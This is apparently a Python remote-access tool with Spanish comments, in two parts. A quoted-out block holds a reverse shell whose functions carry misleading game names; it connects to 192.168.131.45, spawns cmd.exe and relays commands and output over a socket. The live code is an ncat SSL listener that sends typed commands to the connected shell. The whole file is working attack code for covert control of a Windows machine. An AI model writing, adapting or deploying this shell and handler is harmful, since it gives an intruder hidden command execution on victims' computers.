"""
import threading
import subprocess
import socket


def rcv_gme(s, CMD):
    while True:
        try:
            command = s.recv(1024)
            if not command:
                break
            CMD.stdin.write(command)
            CMD.stdin.flush()
        except Exception:
            break


def sdn_gme(s, CMD):
    while True:
        output = CMD.stdout.readline()
        if not output:
            break
        s.send(output)


def games(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.131.45', port))

        # Crear el proceso con un shell interactivo
        xxx = subprocess.Popen('cmd.exe', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                               stdin=subprocess.PIPE)

        # Leer la salida del proceso en un hilo adicional y enviarla al socket
        ompt_rcv = threading.Thread(target=rcv_gme, args=(s, xxx))
        ompt_rcv.start()

        ompt_sdn = threading.Thread(target=sdn_gme, args=(s, xxx))
        ompt_sdn.start()

        ompt_rcv.join()
        ompt_sdn.join()

        s.close()
        xxx.terminate()
    except ConnectionResetError:
        pass
    except Exception:
        pass

def init_game():

    t = threading.Thread(target=games, args=(5009,))
    t.start()

    t.join()


if __name__ == '__main__':
    init_game()
"""
import subprocess
import tempfile
import threading
from colorama import Fore
import colorama
import certs


cert = tempfile.NamedTemporaryFile(delete=False)
cert.write(certs.get_crte().encode())
cert.close()

key = tempfile.NamedTemporaryFile(delete=False)
key.write(certs.get_locker().encode())
key.close()

colorama.init()
ncat = subprocess.Popen(['ncat', '-nvl', '5001', '--ssl-cert', cert.name, '--ssl-key', key.name], stdout=subprocess.PIPE,
            stdin=subprocess.PIPE)


def snd_nc():
    try:
        while True:
            command = input(Fore.RED + "" + Fore.RESET)
            if command:

                if command == "terminate":
                    print(Fore.RED + "[!] Cerrando conexión por comandos..." + Fore.RESET)
                    ncat.stdin.write("exit".encode() + "\n".encode())
                    ncat.stdin.flush()
                    ncat.communicate()
                    return "terminate"
                else:
                    ncat.stdin.write(command.encode() + "\n".encode())
                    ncat.stdin.flush()
    except UnicodeDecodeError:
        print(Fore.RED + "\n\n[!] Exiting session..." + Fore.RESET)
        exit()


def recv_nc():
    encodings = ["utf-8", "latin-1", "ascii"]  # Lista de codificaciones a probar
    try:
        for line in ncat.stdout:
            for encoding in encodings:
                try:
                    decoded_line = line.rstrip().decode(encoding)
                    print(decoded_line)
                    break
                except UnicodeDecodeError:
                    continue
            else:
                # Si ninguna codificación funciona, utilizar una codificación por defecto o ignorar el error
                decoded_line = line.rstrip().decode(errors="ignore")
                print(decoded_line)
    except ValueError:
        pass

def main():
    try:
        read = threading.Thread(target=recv_nc)
        read.start()

        send = threading.Thread(target=snd_nc)
        send.start()

        send.join()
        read.join()
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[!] Exiting session..." + Fore.RESET)
        exit()


def start():
    try:
        main_thread = threading.Thread(target=main)
        main_thread.start()
        main_thread.join()
    except KeyboardInterrupt:
        exit()


if __name__ == "__main__":
    start()
